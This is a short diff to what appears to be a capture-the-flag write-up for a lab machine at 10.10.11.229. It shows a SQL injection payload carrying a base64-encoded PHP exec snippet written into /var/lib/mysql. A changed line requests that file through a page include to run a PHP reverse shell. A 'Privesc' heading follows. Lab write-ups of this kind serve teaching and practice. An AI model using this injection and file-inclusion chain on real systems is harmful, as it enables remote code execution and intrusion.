@@ -428,7 +428,7 @@ quantity=1&product_id=%0A'%3bselect+from_base64('PD9waHAgZXhlYygicHJpbnRmIFltRnp
 
 And finally we can just use this to execute the php reverse shell with a get
 ```bash
-curl 'http://10.10.11.229/shop/index.php?page=/var/lib/mysql/shell'
+xdg-open 'http://10.10.11.229/shop/index.php?page=/var/lib/mysql/shell'
 ```
 
 ## Privesc
